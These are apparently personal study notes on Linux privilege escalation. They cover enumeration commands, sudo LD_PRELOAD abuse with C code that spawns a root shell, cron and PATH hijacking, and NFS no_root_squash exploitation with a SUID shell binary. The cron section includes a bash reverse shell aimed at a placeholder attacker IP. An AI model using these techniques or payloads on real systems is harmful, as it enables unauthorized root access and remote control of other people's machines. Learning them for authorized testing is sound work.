
## Linux Privilege Escalation
#### Enumeration
`hostname`: get hostname of target machine
`uname -a`: get kernel info
`/proc/version`: information about kernel version, compiler, etc.
`/etc/issue`: information about OS
Good to look at all 3 for clearest understanding of system

`ps` Command:
- `ps -A`: view all running processes
- `ps axjf`: view process tree
- `ps aux`: show processes for all users, user that launched each process, and processes not attached to terminal

`env`: show environment variables
`sudo -l`: list commands current user can run with `sudo`
`ls -la` (make sure to use `-la`)
`id`: view user's privilege level and group memberships
`/etc/passwd`: discover users on system
Can `grep` for `home` to filter for human users (as opposed to system/service ones)
`history`: view command history
`ifconfig`: view network interface info
`ip route`: view available network routes

`netstat` Command:
- `netstat -a`: show all listening ports and established connections
- `netstat -l`: list listening ports
- `netstat -s`: list network usage statistics by protocol
- Can add `t` or `u` to options to filter for TCP or UDP respectively
- `netstat -tp`: list connections with service name and PID
- Add `-l` to include listening ports
- `netstat -i`: show interface statistics
- `netstat -ano`: Display all sockets, do not resolve names, display timers

`find` command:
- General syntax: `find [path] [options]`
- `-name [name]`: file name
- `-type [d/f]`: directory/file
- `-perm [permissions]`: files with given permissions
- `-user [user]`: files owned by given user
- `-mtime [days]`: files modified in last x days
- `-atime [days]`: files accessed in last x days
- `-cmin [mins]`: files changed in last x minutes
- `-amin [mins]`: files accessed in last x minutes
- `-size [size]`: files of given size, `+` or `-` for larger/smaller
- Add `2>/dev/null` to silence errors
- Can use for development tools, supported languages
- Find files with SUID bit set: `find / -perm -u=s -type f 2>/dev/null`

#### Automated Enumeration
Dependent on target system environment
LinPeas
LinEnum
Linux Exploit Suggester
Linux Smart Enumeration
Linux Priv Checker

#### Kernel Exploits
Find kernel version, search for exploits, run
Don't be too specific with kernel version
Can use `SimpleHTTPServer` Python module on own machine and `wget` on target machine

#### Sudo
Using limited sudo privileges
Check with `sudo -l`
Can leverage application functions to leak information
https://gtfobins.github.io

`LD_PRELOAD` technique:
- Check if `env_keep` option is enabled
- Write C code and compile as shared object (.so) file
- Run with `sudo` and `LD_PRELOAD` pointing to .so file
C code:
```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
Compile with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` (assuming program is called `shell.c`)
Run with `sudo LD_PRELOAD=/home/user/ldpreload/shell.so [program user is authorized to run with sudo]`

#### SUID
Files executed with permission level of file owner or group owner
`find / -type f -perm -04000 -ls 2>/dev/null`
Search on GTFOBins

#### Capabilities
Manage privileges at more granular level
Applies to binaries rather than users
`getcap -r / 2>/dev/null`

#### Cron Jobs
Cron jobs run with privileges of owner, not current user
System-wide cron jobs in `/etc/crontab`
Look for publicly writable scripts called by root cron jobs
If script is missing, can potentially create script with same name
If full path not specified, will check paths in PATH variable
Script for reverse shell:
```
#!/bin/bash

bash -i >& /dev/tcp/[attacker IP]/[attacker port] 0>&1
```

#### PATH
Environment variable for where to search for executables
PE requires script that runs with root privileges and looks for file in path
Look for writable folders under PATH
`find / -writable 2>/dev/null`, compare with `echo $PATH`
If `/tmp` is writable, can add to PATH with `export PATH=/tmp:$PATH`
For simple shell, `echo "/bin/bash" > [file]` and `chmod +x [file]`

#### NFS
Misconfigurations in Network File Sharing
`/etc/exports` file
Vulnerable if `no_root_squash` option present
Enumerate mountable shares from attacking machine with `showmount -e [target IP]`
Mount `no_root_squash` share to attacking machine
`mkdir [dir]`
`mount -o rw [target IP]:/[share] [dir]`
Create executable with SUID bits set
```
int main() {
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

```
gcc nfs.c -o nfs -w
chmod +s nfs
```
File will be present on target system due to mounted share